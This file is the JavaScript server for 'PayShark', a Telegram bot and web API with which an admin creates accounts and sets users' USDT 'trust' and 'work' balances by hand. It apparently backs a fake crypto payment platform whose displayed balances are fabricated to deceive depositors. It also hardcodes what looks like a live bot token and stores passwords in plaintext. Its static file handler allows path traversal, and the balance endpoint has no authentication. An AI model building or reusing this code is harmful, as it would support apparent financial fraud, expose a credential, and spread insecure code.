const http = require('http');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '8378241421:AAHUAO79gDB_JqB6_jkE9WL6iqEJN_c9u2A';
const ADMIN_CHAT_ID = '8131912766';
const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
const PORT = process.env.PORT || 3000;

// ===== ACCOUNTS =====
function loadAccounts() {
  try {
    return JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8'));
  } catch (e) {
    return [];
  }
}

function saveAccounts(accounts) {
  fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accounts, null, 2), 'utf8');
}

// ===== TELEGRAM BOT =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Pending confirmations: { messageId: { email, type } }
const pendingConfirmations = {};

bot.onText(/\/start/, (msg) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;
  bot.sendMessage(msg.chat.id,
`<b>PayShark - Управление аккаунтами</b>

Команды:
/add <code>email password</code> — создать аккаунт
/del <code>email</code> — удалить аккаунт
/list — список аккаунтов
/setbalance <code>email сумма</code> — установить траст баланс
/setwork <code>email сумма</code> — установить рабочий баланс`, { parse_mode: 'HTML' });
});

bot.onText(/\/add (.+)/, (msg, match) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;

  const parts = match[1].trim().split(/\s+/);
  if (parts.length < 2) {
    bot.sendMessage(msg.chat.id, 'Формат: /add email password');
    return;
  }

  const [email, password] = parts;
  const accounts = loadAccounts();

  const exists = accounts.find(a => a.email === email);
  if (exists) {
    bot.sendMessage(msg.chat.id, `Аккаунт ${email} уже существует.`);
    return;
  }

  accounts.push({ email, password, balance: 0, work_balance: 0 });
  saveAccounts(accounts);

  bot.sendMessage(msg.chat.id,
`<b>Аккаунт создан</b>
Email: <code>${email}</code>
Пароль: <code>${password}</code>`, { parse_mode: 'HTML' });
});

bot.onText(/\/del (.+)/, (msg, match) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;

  const email = match[1].trim();
  let accounts = loadAccounts();
  const before = accounts.length;
  accounts = accounts.filter(a => a.email !== email);

  if (accounts.length === before) {
    bot.sendMessage(msg.chat.id, `Аккаунт ${email} не найден.`);
    return;
  }

  saveAccounts(accounts);
  bot.sendMessage(msg.chat.id, `Аккаунт ${email} удалён.`);
});

bot.onText(/\/list/, (msg) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;

  const accounts = loadAccounts();
  if (accounts.length === 0) {
    bot.sendMessage(msg.chat.id, 'Нет аккаунтов.');
    return;
  }

  const list = accounts.map((a, i) =>
    `${i + 1}. <code>${a.email}</code> | <code>${a.password}</code>\n   Траст: ${a.balance || 0} USDT | Рабочий: ${a.work_balance || 0} USDT`
  ).join('\n');

  bot.sendMessage(msg.chat.id, `<b>Аккаунты (${accounts.length}):</b>\n\n${list}`, { parse_mode: 'HTML' });
});

bot.onText(/\/setbalance (.+)/, (msg, match) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;

  const parts = match[1].trim().split(/\s+/);
  if (parts.length < 2) {
    bot.sendMessage(msg.chat.id, 'Формат: /setbalance email сумма');
    return;
  }

  const [email, amountStr] = parts;
  const amount = parseFloat(amountStr);
  if (isNaN(amount)) {
    bot.sendMessage(msg.chat.id, 'Неверная сумма.');
    return;
  }

  const accounts = loadAccounts();
  const user = accounts.find(a => a.email === email);
  if (!user) {
    bot.sendMessage(msg.chat.id, `Аккаунт ${email} не найден.`);
    return;
  }

  user.balance = amount;
  saveAccounts(accounts);
  bot.sendMessage(msg.chat.id, `Траст баланс ${email}: <b>${amount} USDT</b>`, { parse_mode: 'HTML' });
});

bot.onText(/\/setwork (.+)/, (msg, match) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;

  const parts = match[1].trim().split(/\s+/);
  if (parts.length < 2) {
    bot.sendMessage(msg.chat.id, 'Формат: /setwork email сумма');
    return;
  }

  const [email, amountStr] = parts;
  const amount = parseFloat(amountStr);
  if (isNaN(amount)) {
    bot.sendMessage(msg.chat.id, 'Неверная сумма.');
    return;
  }

  const accounts = loadAccounts();
  const user = accounts.find(a => a.email === email);
  if (!user) {
    bot.sendMessage(msg.chat.id, `Аккаунт ${email} не найден.`);
    return;
  }

  user.work_balance = amount;
  saveAccounts(accounts);
  bot.sendMessage(msg.chat.id, `Рабочий баланс ${email}: <b>${amount} USDT</b>`, { parse_mode: 'HTML' });
});

// Handle callback queries (confirm/reject buttons)
bot.on('callback_query', (query) => {
  if (String(query.message.chat.id) !== ADMIN_CHAT_ID) return;

  const data = query.data;

  // confirm_trust_email or confirm_work_email
  if (data.startsWith('confirm_trust_') || data.startsWith('confirm_work_')) {
    const isTrust = data.startsWith('confirm_trust_');
    const email = data.replace(isTrust ? 'confirm_trust_' : 'confirm_work_', '');
    const typeName = isTrust ? 'траст баланс' : 'рабочий счёт';

    bot.sendMessage(query.message.chat.id,
      `Введите сумму пополнения на <b>${typeName}</b> для <code>${email}</code> (в USDT):`,
      { parse_mode: 'HTML', reply_markup: { force_reply: true } }
    ).then((sentMsg) => {
      pendingConfirmations[sentMsg.message_id] = { email, type: isTrust ? 'trust' : 'work' };
    });
    bot.answerCallbackQuery(query.id, { text: 'Введите сумму' });

  } else if (data.startsWith('reject_')) {
    bot.editMessageText(
      query.message.text + '\n\n❌ Отклонено',
      { chat_id: query.message.chat.id, message_id: query.message.message_id, parse_mode: 'HTML' }
    );
    bot.answerCallbackQuery(query.id, { text: 'Заявка отклонена' });
  }
});

// Handle reply with amount
bot.on('message', (msg) => {
  if (String(msg.chat.id) !== ADMIN_CHAT_ID) return;
  if (!msg.reply_to_message) return;

  const replyId = msg.reply_to_message.message_id;
  const pending = pendingConfirmations[replyId];
  if (!pending) return;

  const amount = parseFloat(msg.text);
  if (isNaN(amount) || amount <= 0) {
    bot.sendMessage(msg.chat.id, 'Неверная сумма. Попробуйте снова.');
    return;
  }

  const accounts = loadAccounts();
  const user = accounts.find(a => a.email === pending.email);
  if (!user) {
    bot.sendMessage(msg.chat.id, `Аккаунт ${pending.email} не найден.`);
    delete pendingConfirmations[replyId];
    return;
  }

  const isTrust = pending.type === 'trust';
  if (isTrust) {
    user.balance = (user.balance || 0) + amount;
  } else {
    user.work_balance = (user.work_balance || 0) + amount;
  }
  saveAccounts(accounts);

  const typeName = isTrust ? 'Траст баланс' : 'Рабочий счёт';
  const newBal = isTrust ? user.balance : user.work_balance;

  bot.sendMessage(msg.chat.id,
`✅ <b>Пополнение подтверждено</b>

<b>Тип:</b> ${typeName}
<b>Аккаунт:</b> <code>${pending.email}</code>
<b>Сумма:</b> +${amount} USDT
<b>Новый баланс:</b> ${newBal} USDT`, { parse_mode: 'HTML' });

  delete pendingConfirmations[replyId];
});

// ===== WEB SERVER =====
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.json': 'application/json'
};

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body)); }
      catch (e) { reject(e); }
    });
  });
}

const server = http.createServer(async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Login API
  if (req.method === 'POST' && req.url === '/api/login') {
    try {
      const { email, password } = await parseBody(req);
      const accounts = loadAccounts();
      const user = accounts.find(a => a.email === email && a.password === password);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      if (user) {
        res.end(JSON.stringify({ success: true, email: user.email, balance: user.balance || 0, work_balance: user.work_balance || 0 }));
      } else {
        res.end(JSON.stringify({ success: false, error: 'Неверная почта или пароль' }));
      }
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Bad request' }));
    }
    return;
  }

  // Get balance API
  if (req.method === 'POST' && req.url === '/api/balance') {
    try {
      const { email } = await parseBody(req);
      const accounts = loadAccounts();
      const user = accounts.find(a => a.email === email);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      if (user) {
        res.end(JSON.stringify({ success: true, balance: user.balance || 0, work_balance: user.work_balance || 0 }));
      } else {
        res.end(JSON.stringify({ success: false, error: 'Аккаунт не найден' }));
      }
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Bad request' }));
    }
    return;
  }

  // Payment request API — sends to Telegram with confirm button
  // type: "trust" or "work"
  if (req.method === 'POST' && req.url === '/api/payment') {
    try {
      const { email, amount, network, address, telegram, type } = await parseBody(req);
      const balType = type === 'work' ? 'work' : 'trust';
      const typeName = balType === 'work' ? 'Рабочий счёт' : 'Траст баланс';

      const message =
`<b>💰 Новая заявка на пополнение</b>

<b>Тип:</b> ${typeName}
<b>Аккаунт:</b> <code>${email}</code>
<b>Сеть:</b> ${network}
<b>Сумма:</b> ${amount} USDT
<b>Адрес:</b> <code>${address}</code>
<b>Telegram:</b> @${(telegram || '').replace('@', '')}
<b>Дата:</b> ${new Date().toLocaleString('ru-RU')}`;

      await bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Подтвердить', callback_data: `confirm_${balType}_${email}` },
            { text: '❌ Отклонить', callback_data: `reject_${balType}_${email}` }
          ]]
        }
      });

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Bad request' }));
    }
    return;
  }

  // Static files
  let url = req.url.split('?')[0];
  if (url === '/') url = '/login.html';

  const filePath = path.join(__dirname, url);
  const ext = path.extname(filePath);

  // Don't serve accounts.json or server.js
  if (url === '/accounts.json' || url === '/server.js') {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404);
      res.end('Not found');
      return;
    }
    res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log('Telegram bot is active.');
});
